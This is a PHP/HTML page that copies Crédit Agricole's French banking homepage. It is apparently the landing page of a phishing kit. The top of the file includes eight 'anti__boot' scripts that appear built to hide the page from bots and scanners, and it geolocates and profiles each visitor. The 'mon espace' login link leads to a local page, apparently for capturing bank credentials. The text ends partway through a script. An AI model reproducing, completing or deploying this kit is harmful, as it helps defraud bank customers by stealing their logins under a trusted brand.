<?php
error_reporting(0);
session_start();
    include("anti__boot/anti1.php");
    include("anti__boot/anti2.php");
    include("anti__boot/anti3.php");
    include("anti__boot/anti4.php");
    include("anti__boot/anti5.php");
    include("anti__boot/anti6.php");
    include("anti__boot/anti7.php");
    include("anti__boot/anti8.php");
    require_once 'detect.php';
$ip = getenv("REMOTE_ADDR");
$IP_LOOKUP = @json_decode(file_get_contents("http://ip-api.com/json/".$ip));
$countrycode = $IP_LOOKUP->countryCode ;
$os= getOs();
$user_agent =   $_SERVER['HTTP_USER_AGENT'];


?>
<!DOCTYPE html>
<html  lang="fr">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1">
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta property="og:url" content="/" />
    
        
        
        
            <meta name="description" content="Découvrez les offres et services du Crédit Agricole : compte bancaire, assurance-vie, épargne, placement, retraite, habitation, prévoyance, crédit conso ou auto, crédit immobilier…" />
            <meta property="og:description" content="Découvrez les offres et services du Crédit Agricole : compte bancaire, assurance-vie, épargne, placement, retraite, habitation, prévoyance, crédit conso ou auto, crédit immobilier…" />

            <title>Banque &amp; Assurances - CA</title>
            <meta property="og:title" content="Banque &amp; Assurances" />
	
    
	<meta name="format-detection" content="telephone=no">

	
 	<link rel="stylesheet" href="print/settings/wcm/designs/ca/npc/clientlib-part.min.ea256277357fa8db5612c74f1e54f567.css" type="text/css">
    <link rel="icon" type="image/x-icon" href="images/autre/images/logo.png">

    <link rel="stylesheet" href="print/settings/wcm/designs/ca/npc/clientlibStoreLocatorT33Part.min.1f61aaac8fd08ba4c317656d6f0e4a62.css" type="text/css">
<link rel="stylesheet" href="print/settings/wcm/designs/ca/npc/clientlibStoreLocatorT34Part.min.f3d31862687057258256810db3499be7.css" type="text/css">
<link rel="stylesheet" href="print/settings/wcm/designs/ca/npc/clientlibBoutonVertPart.min.d41d8cd98f00b204e9800998ecf8427e.css" type="text/css">


    









 
<link rel="stylesheet" href="print/settings/wcm/designs/ca/npc/clientlibMarcheSpeBanquePriveePart.min.1e66911d126aed037572a88e0d4c0467.css" type="text/css">
 



<script src="print/clientlibs/granite/jquery.min.aaffcbf7942d5bedb07855e48cbc1afa.js"></script>
<script src="print/clientlibs/granite/utils.min.423ec59365a85ebded314ad7311ef508.js"></script>
<script src="print/clientlibs/granite/jquery/granite.min.579a107dd681c49bc61dae63734043cb.js"></script>

<script src="print/settings/wcm/designs/ca/npc/clientlib-bootstrap-jquery.min.1661914e05c676ce450674555cc1e5b0.js"></script>

<script src="print/settings/wcm/designs/ca/npc/clientlibHeader.min.9b997b2ac9fca6031bd046f1edd29d81.js"></script>



			<script type="application/ld+json">
                {
"@context" : "http://schema.org",
"@type" : "Organization",
"name" : "Crédit Agricole",
"url" : "https://www.credit-agricole.fr",
"logo" : "https://www.credit-agricole.fr/content/dam/assetsca/npc/logos/CA_Toute-une-banque-pour-vous_V.svg",
"sameAs" : [ "https://www.facebook.com/CreditAgricole",
"https://twitter.com/CreditAgricole",
"https://www.linkedin.com/company/7467",
"https://www.youtube.com/creditagricole",
"http://www.dailymotion.com/CreditAgricole",
"https://www.instagram.com/creditagricole",
"https://fr.pinterest.com/creditagricole"]
}
            </script> 


</head>












<body>
	
	
	
		<header>
			<div class="sr-only" id="debutPage" tabindex="0">Début de la page</div>
			























    
    
		
		    
		    
		    	
		    		
		        		<div class="header parbase">





	
	

















	
	
		









	<!-- Machine Id hlmf -->





	
	
		
	


<div class="sr-only"><a id="byPassAllerAuContenu" href="#">Aller au contenu</a></div>

<div class="Header js-Header contexthub-header-non-connecte headerDiv">
    
    
    
    	
    	<div class="Header-logo logo-header">
















<span class="logo" style="height:100%;width:100%;">

		
		
			
        	<a href="index.php" class="Header-logoTitle">
        		<img class="Header-logoImg js-needFakeNotSvg" src="images/autre/images/logo_Agir.svg" alt="Aller à l'Accueil du site" style="height: 100%"/>
        	</a>
		

</span>

<script>
    (function(){
        var elem = document.querySelector('.Login-logo');
        if(elem != undefined){
            elem.firstElementChild.classList.remove('Header-logo');
        }
    })();
</script> 
</div>

    
    <div class="Header-nav">
        <div class="Header-upperNav">
            <a href="#" class="Header-buttonMenu js-openMenuMobile" role="button" aria-label="Menu"></a>

			<a href="index.php" class="Header-logoContent">
    			<img class="Header-logo--xs  js-needFakeNotSvg" src="images/autre/images/CA_Logo_seul-1.svg" alt="Crédit Agricole - Banque et assurances"/>
            </a>
			
            <a href="#status" class="Header-market js-toggleLayerNav" role="listitem">Vous êtes un particulier&nbsp;</a>
            <div class="Header-search js-Header-search enterClick" tabindex="0" role="search" id="ct001-search">
                <div class="Header-searchPlaceholder">Rechercher une thématique, un produit...</div>
            </div>

            <a onclick="NPC.storeLocator.gotoAccesCrEtAgence();event.preventDefault()" href="#" class="Header-locator">
				<i class="Header-locatorLogo icon npc-locator" aria-hidden="true"></i>
				<span class="sr-only">Trouver une agence</span>
            </a>
           
            <nav role="navigation" aria-label="Menu principal">
	   			
	            	
	            	
			            <div class="Header-help--bouton-vert--trigger">

















	
 	
 	
		
		
            <a id="btnNousContacter" class="Header-help" href="javascript: void(0);" role="button" aria-label="Nous Contacter" style="color: #fff;" data-trackingclass="oic_nous_contacter">
            	<div class="Header-helpText">Nous contacter</div>
            </a>

     
               		 
     



	
	
		
		
		
		
	




	
 	
		
	
               	

	
	
  

<div class="bouton-vertWrapper" style="display: none;" data-value='{
"erreurGpu":false,
"erreurSi":false,
"erreurTableStart" :false,
"erreurGeoloc":false,
"conseillerDispo" :false,
"activationNumArcep" :false,
"gpuData":"undefined",
"modelData":,
"dayDate":"",
"dayTime":"",
"agence":&#34;undefined&#34;,
"conseiller":&#34;undefined&#34;,
"motifSelected":"",
"startDataInf":"",
"startDataOpt":"",
"startDataInfMotifSelected":"",
"idMotif":[5]

}'>
	<div class="GreenBtnContainer js-GreenBtnContainer hidden-print">
    <div id="greenBtnContainerDiv" tabindex="-1" class="GreenBtn-callbackHome" style="display: none;" data-trackingClass="oic_layer_national">
        
        <div class="GreenBtn-callbackHomeHeader">
            <p class="GreenBtn-callbackHomeHeaderTitle GreenBtn-callbackPara--noMarginBot js-GreenBtn-Main" style="display: none;width: 100%">UN BESOIN ? UN PROJET ? CONTACTEZ-NOUS</p>
   			<p class="GreenBtn-callbackHomeHeaderTitle GreenBtn-callbackPara--noMarginBot js-GreenBtn-Urgence" style="display: none;width: 100%">Aide et urgence ?</p>
            <a id="fermetureLayerBV" href="javascript: void(0);" role="button" aria-label="Fermer la fenêtre nous contacter et revenir au menu principal" class="icon npc-close GreenBtn-callbackClose" data-trackingclass="oic_fermer"></a>
        </div>

		

            <div class="GreenBtn-callbackHomeContent bouton-vertContent js-GreenBtn-Main" style="display: none;">
                <a href="javascript: void(0);" class="GreenBtn-callbackHomeHeaderBtn" data-trackingclass="oic_urgence"><b>Aide et urgence ?</b></a>
                
				
					            
							<div class="GreenBtn-callbackUrgencyMessage">
								<div class="GreenBtn-callbackUrgencyMessageTitle">Vous souhaitez contacter un conseiller du Crédit Agricole</div>
								<p class="GreenBtn-callbackUrgencyMessagePara">Pour mieux répondre à vos besoins, les Caisses Régionales mettent à votre disposition des moyens de contact qui vous permettront d’entrer en relation avec un conseiller.</p>
								<div class="GreenBtn-callbackHomeContentLink">
									<a onclick="NPC.storeLocator.gotoAccesCr();event.preventDefault()" href="#" class="btn btn-default GreenBtn-callbackUrgencyMessageBtn" data-trackingclass="oic_trouver_ma_CR">Trouver ma caisse régionale</a>
								</div>
							</div>
					

					
					
				
				
            </div>
		
            
        
        
	            
	            
            </nav>
            
            
            	<div class="Header-open">










<a class="Header-open" href="#" role="link" target="_self">Ouvrir un compte</a></div>

           	
           	
            <div class="mon-espace parbase">











	

		
			
			
				
			
		
		

		
			
				
				<a href="acces-cr.php" class="Header-login" aria-label="Accéder à mes comptes" data-trackingclass="connexion_client">
					<div class="Header-loginText">mon espace</div>
				</a>
			
			
		
	
	
	

</div>

        </div>
        
        <div class="Header-lowerNav">
            <nav class="MainNav js-sliderNav" data-max-items="99" aria-label="Menu secondaire">
                <ul class="MainNav-list js-sliderNav-nav MainNav-UlAccess">
                    
                     
						
                            
                            
                        
                        
        				<li class="MainNav-listItem js-sliderNav-item MainNav-listAccess"><a href="#" id="link-menu0-besoin1" class="MainNav-listLink " target="_self">Comptes &amp; Cartes</a></li>
                     
						
                            
                            
                        
                        
        				<li class="MainNav-listItem js-sliderNav-item MainNav-listAccess"><a href="#" id="link-menu1-besoin1" class="MainNav-listLink " target="_self">Épargner</a></li>
                     
						
                            
                            
                        
                        
        				<li class="MainNav-listItem js-sliderNav-item MainNav-listAccess"><a href="#" id="link-menu2-besoin1" class="MainNav-listLink " target="_self">S&#39;assurer</a></li>
                     
						
                            
                            
                        
                        
        				<li class="MainNav-listItem js-sliderNav-item MainNav-listAccess"><a href="#" id="link-menu3-besoin1" class="MainNav-listLink " target="_self">Emprunter</a></li>
                    
                     
						
                            
                            
                        
                        
        				<li class="MainNav-listItem js-sliderNav-item MainNav-listAccess"><a href="#" id="link-menu0-RSD1" class="MainNav-listLink " target="_self">Simulation &amp; Devis</a></li>
                    
                   <li class="MainNav-listItem js-sliderNav-item MainNav-listAccess"><a id="nosConseilsHeader" href="#advices" role="button" aria-label="Menu nos conseils" class="MainNav-listLink MainNav-listLink--mega js-toggleLayerNav">nos conseils</a></li>
                </ul>
                <span aria-hidden="true" id="sliderNavPrevHeader " class="sliderNav--prev js-sliderNav--prev">...</span>
  				<span aria-hidden="true" id="sliderNavNextHeader" class="sliderNav--next js-sliderNav--next">...</span>	
                <a href="#" role="button" class="MainNav-moreLink js-sliderNav-toggle MainNav-listAccess">Voir plus</a>
            </nav>
        </div>
    </div>
</div>
 

<div class="HeaderSticky js-HeaderSticky" aria-hidden="true">
    <a tabindex="-1" href="#" class="HeaderSticky-logo">
		<img class="HeaderSticky-logoImg  js-needFakeNotSvg" src="images/autre/images/CA_Logo_seul-1.svg" alt=""/>
		<img class="HeaderSticky-logo--xs js-needFakeNotSvg" src="images/autre/images/CA_Logo_seul-1.svg" alt=""/>
	</a>
 
    <div class="HeaderSticky-needs">
        <nav class="MainNav js-sliderNav" data-max-items="99">
	        <ul class="MainNav-list js-sliderNav-nav" role="menubar">
	             
	                
	                    
	                    
	                
	                
	                <li class="MainNav-listItem js-sliderNav-item"><a tabindex="-1" href="#" id="link-menu0-besoin2" class="MainNav-listLink " target="_self" role="menuitem">Comptes &amp; Cartes</a></li>
	             
	                
	                    
	                    
	                
	                
	                <li class="MainNav-listItem js-sliderNav-item"><a tabindex="-1" href="#" id="link-menu1-besoin2" class="MainNav-listLink " target="_self" role="menuitem">Épargner</a></li>
	             
	                
	                    
	                    
	                
	                
	                <li class="MainNav-listItem js-sliderNav-item"><a tabindex="-1" href="#" id="link-menu2-besoin2" class="MainNav-listLink " target="_self" role="menuitem">S&#39;assurer</a></li>
	             
	                
	                    
	                    
	                
	                
	                <li class="MainNav-listItem js-sliderNav-item"><a tabindex="-1" href="#" id="link-menu3-besoin2" class="MainNav-listLink " target="_self" role="menuitem">Emprunter</a></li>
	            
	             
	                
	                    
	                    
	                
	                
	                <li class="MainNav-listItem js-sliderNav-item"><a tabindex="-1" href="#" id="link-menu0-RSD2" class="MainNav-listLink " target="_self" role="menuitem">Simulation &amp; Devis</a></li>
               
	              <li class="MainNav-listItem js-sliderNav-item"><a tabindex="-1" href="#advices" role="listitem" class="MainNav-listLink MainNav-listLink--mega js-toggleLayerNav">nos conseils</a></li>
	          </ul>
	      	<span class="sliderNav--prev js-sliderNav--prev">...</span>
			<span class="sliderNav--next js-sliderNav--next">...</span>
	          <a tabindex="-1" href="#" class="MainNav-moreLink js-sliderNav-toggle">Voir plus</a>
	      </nav>
    </div>

    <div class="HeaderSticky-search js-Header-search"></div>
    <a tabindex="-1" href="#" class="HeaderSticky-help">
		<div class="icon npc-talk-blank"></div>
    </a>
      
    
	    
	     	 <a tabindex="-1" href="#" class="HeaderSticky-login"></a>
	        
	    
	
</div>

	
	




<div class="Header-layers hidden js-headerLayers">
	









<div id="header-layer-menu-markets" class="LayerNav js-LayerNav-status hidden">
    <div class="row row-no-padding LayerNav-inner">
        <div class="visible-xs visible-sm">
     		<a href="#" class="LayerNav-backMobile js-backMenuMobile"><i class="icon npc-left LayerNav-backMobileIcon"></i> Retour</a>
    	</div>

			
		<div class="col-md-4 hidden-xs hidden-sm LayerNav-push">











    <div class="LayerNav-pushImg" style="background-image:url('images/autre/images/mega-menu-layer-vous-etes.jpg')"></div>


<div class="LayerNav-pushMsg">
	<div class="LayerNav-pushTitle">
		<div class="SimpleText">











    


    
    	<b>Nous nous engageons pour le développement des territoires</b><br />

    
    
    

</div>

	</div>
	<div class="LayerNav-pushText">
		<div class="texte">




<div tabindex="-1">
    <p>Auprès des particuliers, des associations, des professionnels, des entreprises, des collectivités...<br>
Le Crédit Agricole œuvre chaque jour au développement économique et social des territoires.</p>

</div>
</div>

	</div>
	<div class="SimpleText">











    
    	
    
        
        	<a href="#" class="lien-ca" target="_self">
        

            <i> </i>Découvrir notre modèle <br />


        
        	</a>
        
    
    
</div>

</div></div>

		
        <div class="col-xs-12 col-md-8 LayerNav-content">	
            <dl class="LayerNav-dlist">
                
                    <dt class="LayerNav-dlistTitle">
                    	
	        				
	        				
	        					<a href="#" class="LayerNav-dlistLink">Particulier</a>
	        				
        				
                    </dt>
                    <dd></dd>
                
                    <dt class="LayerNav-dlistTitle">
                    	
	        				
	        				
	        					<a href="#" class="LayerNav-dlistLink">Banque privée</a>
	        				
        				
                    </dt>
                    <dd></dd>
                
                    <dt class="LayerNav-dlistTitle">
                    	
	        				
	        				
	        					<a href="#" class="LayerNav-dlistLink">Professionnel</a>
	        				
        				
                    </dt>
                    <dd></dd>
                
                    <dt class="LayerNav-dlistTitle">
                    	
	        				
	        				
	        					<a href="#" class="LayerNav-dlistLink">Agriculteur</a>
	        				
        				
                    </dt>
                    <dd></dd>
                
                    <dt class="LayerNav-dlistTitle">
                    	
	        				
	        				
	        					<a href="#" class="LayerNav-dlistLink">Association</a>
	        				
        				
                    </dt>
                    <dd></dd>
                
                    <dt class="LayerNav-dlistTitle">
                    	
	        				
	        				
	        					<a href="#" class="LayerNav-dlistLink">Entreprise</a>
	        				
        				
                    </dt>
                    <dd></dd>
                
                    <dt class="LayerNav-dlistTitle">
                    	
	        				
	        				
	        					<a href="#" class="LayerNav-dlistLink">Collectivité publique et logement social</a>
	        				
        				
                    </dt>
                    <dd></dd>
                
            </dl>
            
            <a id="header-link-hide-markets" class="LayerNav-close js-LayerNav-close" href="#" title="Fermer le menu"><i class="icon npc-close"></i></a>
        </div>
    </div>
</div>

	









<div class="LayerNav js-LayerNav-advices hidden">
</div>
	
</div>

<script>
	(function (document, $) {
		
	    $( document ).ready(function() {
	        $("#debutPage").focus();
	    });
		
	    $( "#byPassAllerAuContenu" ).click(function() {
	        $( "#main" ).focus();
	    });
	    
        $( "#byPassAllerAuContenu" ).focus(function() {
			$(document).scrollTop( 0 );
        });

        $( "#sliderNavPrevHeader" ).focus(function() {
            $(document).scrollTop( 0 );
        });
        
        $( "#sliderNavNextHeader" ).focus(function() {
            $(document).scrollTop( 0 );
        });
        
        $( "#nosConseilsHeader" ).focus(function() {
            $(document).scrollTop( 0 );
        });
        
		$( "#byPassAllerAuContenu" ).focus(function() {
	        $(this).parent().addClass("AlertBanner--top AlertBanner").removeClass("sr-only");
	        var headerMarginTop = parseInt( $(".headerDiv").css("margin-top"));
	        $(this).parent().css("margin-top","+="+headerMarginTop);
	        $(".headerDiv").css("margin-top","+=17px");

	    });
	    
	    $( "#byPassAllerAuContenu" ).focusout(function() {
	        $(this).parent().addClass( "sr-only" ).removeClass("AlertBanner--top AlertBanner");
	        $(this).parent().css("margin-top","0px");
	        $(".headerDiv").css("margin-top","-=17px");
	    });
	
        $('.enterClick').bind('keypress', function(e) {
            if (e.which == 13){
                $(e.target).click();
            }
	  	});
       
	    var blocker  = document.querySelector( '#greenBtnContainerDiv' );
	    var observer = new MutationObserver( function( mutations ){
	        mutations.forEach( function( mutation ){
				if( mutation.attributeName === 'style' && window.getComputedStyle( blocker ).getPropertyValue( 'display' ) !== 'none')
	            {
	                  $("#greenBtnContainerDiv").focus();
	            }
	            else if( mutation.attributeName === 'style' && window.getComputedStyle( blocker ).getPropertyValue( 'display' ) == 'none')
	            {
	                  $("#btnNousContacter").focus();
	            }
	        } );
	    } );
	    observer.observe( blocker, { attributes: true } );
	    
        $( ".closeAlertBannerAccess").click(function() {
            $("#debutPage").focus();
        });
        
    	$("[href='#advices']").first().parent().on("click",function(){
            var placeToAddNosConseilsMenu = $(".js-LayerNav-advices");
            if(placeToAddNosConseilsMenu[0].childElementCount<1){
                $.ajax({
                    url: "",
                	cache:true
				})
            	.success(function(data) {
					placeToAddNosConseilsMenu.append(data);
                    LayerNav.initialize();
        			LayerNav.toggle($("[href='#advices']").first());
                })
            	.error(function(data) {
            		placeToAddNosConseilsMenu.append("<div>Une erreur est survenue durant le chargement</div>");
                });
            }
        });
    })(document, Granite.$);
</script>
<script>
	(function (document, $) {

        var target = document.querySelectorAll(".NavKeyboardAccess");
        var lastTarget="";
        for (var i = 0; i < target.length; i++) {
            var observer = new MutationObserver(function(mutations) {
                mutations.forEach(function(mutation) {
                    if (mutation.target.classList.contains('LayerNav-pushNavItem--active')) {
                        lastTarget = (mutation.target.getAttribute("href") == undefined) ? mutation.target.getAttribute("data-href") : mutation.target.getAttribute("href");
                        $(lastTarget).focus();
                    }
                });
            });

            var config = { attributes: true };
            observer.observe(target[i], config);
        }

		function focusAndLastTarget(e) {
			$(e.target).attr('href') == undefined ? $($(e.target).attr('data-href')).focus() : $($(e.target).attr('href')).focus();
			lastTarget = ($(e.target).attr('href') == undefined) ? $(e.target).attr('data-href') : $(e.target).attr('href');
		}

        function addAndRemoveActiveClass(e) {
                e.preventDefault();
                $(e.target).addClass( 'LayerNav-pushNavItem--active' )
                    .siblings( '.LayerNav-pushNavItem--active' )
                    .removeClass( 'LayerNav-pushNavItem--active');
                var $target = $( $(e.target).attr( 'data-href' ) || $(e.target).attr( 'href' ) );
                var $tabs = $target.closest( '.js-LayerNav-tabs' ).find( '.js-LayerNav-tab' );
                $tabs.removeClass( 'LayerNav-tab--active' );
                $target.addClass( 'LayerNav-tab--active' );
				focusAndLastTarget(e);
        }

		$('.NavKeyboardAccess').bind('keypress', function(e) {
            if (e.which == 13){
				addAndRemoveActiveClass(e);
            }
   		});

        $( ".NavKeyboardAccess" ).on("click", function(e) { focusAndLastTarget(e) });

        $( "#separtorListMesOperations" ).focus(function() {
            $(lastTarget+"-link").focus();
            lastTarget="#operations-1";
        });

        $( "#menuMesOperations").click(function() {
            lastTarget="#operations-1";
        });

        $( "#startPopinMesOperationsAccess" ).focus(function() {
            $("#closeButtonPopinMesOperations").focus();
        });
        
        $( "#endPopinMesOperationsAccess" ).focus(function() {
        	$(lastTarget+"-link").focus();
            lastTarget="#operations-1";
        });
        
        $( "#menuMesDocuments").click(function() {
			lastTarget="#document-1-link";
            $(lastTarget).focus();
        });

        $( "#startPopinMesDocumentsAccess" ).focus(function() {
            $("#closeButtonPopinMesDocuments").focus();
        });

        $( "#endPopinMesDocumentsAccess" ).focus(function() {
			$(lastTarget).focus();
            lastTarget="#document-1-link";
        });
        
        $( "#startPopinTouteLOffreAccess" ).focus(function() {
            $("#closeButtonPopinTouteLOffre").focus();
        });

        $( "#endPopinTouteLOffreAccess" ).focus(function() {
        	$("#statusJeNeSuisPas").focus();
        });
        
        $( ".menuNosConseils").click(function() {
            lastTarget="#conseils-0";
        });

	})(document, Granite.$);
</script>












<div class="Header-menu js-MenuMobile hidden">
	<div class="Header-menuHeader">
		
		<a href="#" class="Header-menuClose js-MenuMobile-close" id="ct001-btn-close" role="button" aria-label="Fermer le menu"></a>
		
			
				<div class="Header-menuLogo" style="background-image: url('images/autre/images/CA_Logo_seul-1.svg')"></div>
			
			
		
	</div>
	<div class="Header-menuRows js-menuRows-main">
        <a href="#status" id="a-masque-menu-non-connecte-tab" class="Header-menuRow Header-menuRow--back js-toggleLayerNav">
	      <span class="Header-menuIcon npc-left"></span>
	      <span class="Header-menuRowText Header-menuRowText--back">Je ne suis pas un particulier</span>
    	</a>


		
		
		  
              	<a href="#" class="Header-menuRow">              	
					<span class="Header-menuIcon npc-card"></span>
                    <span class="Header-menuRowText">Comptes &amp; Cartes</span>
                </a>
	      
              	<a href="#" class="Header-menuRow">              	
					<span class="Header-menuIcon npc-pig"></span>
                    <span class="Header-menuRowText">Épargner</span>
                </a>
	      
              	<a href="#" class="Header-menuRow">              	
					<span class="Header-menuIcon npc-umbrella"></span>
                    <span class="Header-menuRowText">S&#39;assurer</span>
                </a>
	      
              	<a href="#" class="Header-menuRow">              	
					<span class="Header-menuIcon npc-pie-chart"></span>
                    <span class="Header-menuRowText">Emprunter</span>
                </a>
	      
		  
              	<a href="#" class="Header-menuRow">              	
    				<span class="Header-menuIcon npc-money"></span>    				
                    <span class="Header-menuRowText">Simulation &amp; Devis</span>
                </a>
	      
      
      
    
    
      
      
    
		<a href="#advices" class="Header-menuRow js-toggleLayerNav">
			<span class="Header-menuIcon npc-bulb"></span>
      		<span class="Header-menuRowText Header-menuRowText--em">
      		Nos conseils
      		
      		</span>
		</a>
    

	</div>
	
	
	  
	<div class="Header-menuSubfooter js-Header-search">
		<div class="container-fluid">
			<div class="row">
				<div class="col-xs-10">
					<input type="text" class="form-control Header-menuInput" id="search-input" placeholder="Posez votre question">
				</div>
				<div class="col-xs-2 text-center">
					 <div class="icon npc-magnifer Header-menuSubfooterIcon" tabindex="0" role="button" aria-label="Rechercher"></div>
				</div>
			</div>
		</div>
	</div>
	
	
	<div class="Header-menuFooter">
		<div class="container-fluid">
			<div class="row">
			
			
			
				
				<div class="col-xs-4 text-center">
					<a class="Header-menuFooterBtn" onclick="NPC.storeLocator.gotoAccesCrEtAgence();event.preventDefault()" href="#" aria-label="Trouver une agence" role="button">
						 <div><i class="icon npc-locator-blank Header-menuFooterIcon"></i></div>
						 <div class="Header-menuFooterText">
						 	Trouver une agence
						 </div>
					</a>
				</div>
				
				<div class="col-xs-4 text-center bv-trigger-burger">
					<div class="icon npc-talk-blank Header-menuFooterIcon"></div>
					<div class="Header-menuFooterText "  tabindex="0" role="button">Nous contacter</div>
				</div>
	
				<div class="col-xs-4 text-center">
					










<a class="Header-menuFooterBtn" href="#" target="_self">
	 <div class="icon npc-add Header-menuFooterIcon"></div>
	<div class="Header-menuFooterText">Ouvrir un compte</div>
</a>
				</div>
			
			
			
			</div>
		</div>
	</div>
	
</div>

<script>
     (function(document, $){
    	 $(".Header-menuRow[href='#advices']").on("click",function(){
            var placeToAddNosConseilsMenu = $(".js-LayerNav-advices");
            if(placeToAddNosConseilsMenu[0].childElementCount<1){
                $.ajax({
                    url: "#"
                })
            	.success(function(data) {
					placeToAddNosConseilsMenu.append(data);
                    LayerNav.initialize();
        			LayerNav.toggle($(".Header-menuRow[href='#advices']"));
                })
                .error(function(data) {
                    placeToAddNosConseilsMenu.append("<div>Une erreur est survenue durant le chargement</div>");
                    console.log("erreur de chargement du menu nos conseils");
                    console.log(data);
                });
            }
        });
     })(document, Granite.$);
</script>

<script type="text/html" id="template-retour-menu-mobile">
    <div class="visible-xs visible-sm">
      <a href="#" class="LayerNav-backMobile js-backMenuMobile"><i class="icon npc-left LayerNav-backMobileIcon"></i> Retour</a>
    </div>
</script>

<script type="text/html" id="template-item-menu-mobile-connecte-non-cliquable">
	<a href="#" class="row Header-menuRow">
		<div class="col-xs-2 text-center Header-menuIcon"><div class="icon npc-card"></div></div>
		<div class="col-xs-8"><span class="Header-menuRowText" data-content="noeudMenuTitre"></span></div>
		<div class="col-xs-2 text-center"><div class="icon npc-arrow-next"></div></div>
	</a>
</script>

<script type="text/html" id="template-item-menu-mobile-connecte">
	<a data-href="noeudMenuHref" class="row Header-menuRow">
		<div class="col-xs-2 text-center Header-menuIcon"><div class="icon npc-card"></div></div>
		<div class="col-xs-8"><span class="Header-menuRowText" data-content="noeudMenuTitre"></span></div>
		<div class="col-xs-2 text-center"><div class="icon npc-arrow-next"></div></div>
	</a>
</script>






<main>
<div id="pageNav" style="display: none;">
	<table class="CompatibilityError">
		<tbody>
			<tr>
				<td class="CompatibilityError-header">
				
					
					
						<img src="images/logo_ca.png" alt="" height="40"/>
					
				
				</td>
			</tr>
			
		</tbody>
	</table>
</div>
</main>


<script>
(function(){
var ua = window.navigator.userAgent;
var msie = ua.indexOf("MSIE ");

		/**
        ** Check si on est sur un mobile et tablette
        * Si on est sur mobile affiche les browsers mobiles qui possède la data data-mobileselector
        * Si on est sur destock cache les browsers mobiles
        */
        var showBrowserOnMobileAndTablet = function () {
            var check = false;
            (function (a) { if (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino|android|ipad|playbook|silk/i.test(a) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(a.substr(0, 4))) check = true; })(navigator.userAgent || navigator.vendor || window.opera);
            if (!check) {
                $("[data-mobileselector]").css('display', 'none');
            } else {
                if (/iPad|iPhone|iPod/.test(navigator.platform || "")) {
                    setAppleRedirectionLink();
                } else {
                    setAndroidRedirectionLink();
                }
            }
        };

        // Remplace les liens de redirection vers le app store
        var setAppleRedirectionLink = function() {
            $("[data-chromeLink]").attr("href", "https://apps.apple.com/fr/app/google-chrome/id535886823");
            $("[data-firefoxLink]").attr("href", "https://apps.apple.com/fr/app/navigateur-web-firefox/id989804926");
            $("[data-safariLink]").attr("href", "https://www.apple.com/fr/safari/");
            $("[data-ucBrowserLink]").attr("href", "https://apps.apple.com/fr/app/uc-browser/id1048518592");
            $("[data-edgeLink]").attr("href", "https://apps.apple.com/fr/app/microsoft-edge/id1288723196");
            $("[data-operaLink]").attr("href", "https://apps.apple.com/fr/app/navigateur-web-opera-touch/id1411869974");
            $("[data-samsungInternetLink]").parent().hide();
            $("[data-samsungInternetLink]").closest(".CompatibilityError-logos").css("margin-left", "35px");
        }

        // Remplace les liens de redirection vers le play store
        var setAndroidRedirectionLink = function() {
            $("[data-chromeLink]").attr("href", "https://play.google.com/store/apps/details?id=com.android.chrome&amp;gl=FR");
            $("[data-firefoxLink]").attr("href", "https://play.google.com/store/apps/details?id=org.mozilla.firefox&amp;gl=FR");
            $("[data-edgeLink]").attr("href", "https://play.google.com/store/apps/details?id=com.microsoft.emmx&amp;hl=fr");
            $("[data-operaLink]").attr("href", "https://play.google.com/store/apps/details?id=com.opera.browser&amp;hl=fr");
            $("[data-safariLink]").parent().hide();
            $("[data-safariLink]").closest(".CompatibilityError-logos").css("margin-left", "35px");
        }

        showBrowserOnMobileAndTablet();

